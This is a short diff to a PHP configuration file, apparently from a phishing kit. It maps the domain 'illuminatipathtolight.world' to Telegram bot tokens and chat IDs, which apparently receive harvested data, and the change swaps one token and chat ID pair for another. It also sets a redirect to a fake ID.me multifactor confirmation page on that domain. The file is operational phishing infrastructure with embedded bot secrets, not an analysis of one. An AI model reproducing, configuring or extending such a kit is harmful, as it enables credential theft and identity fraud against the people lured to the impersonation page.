@@ -87,7 +87,7 @@ $site_map = [
     'illuminatipathtolight.world' => [
         "bots" => [
             ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
-            ['token' => '7952525150:AAHXfhactryTuwOnidJzq6UnDGxVEFkDk8k', 'chat_id' => '7982337001'],
+           ['token' => '7570530329:AAGCyvAYZQd45RebzrTY1oHoDEOmxe1ackI', 'chat_id' => '6494353790'],
         ],
         "redirect" => "https://illuminatipathtolight.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html"
     ],
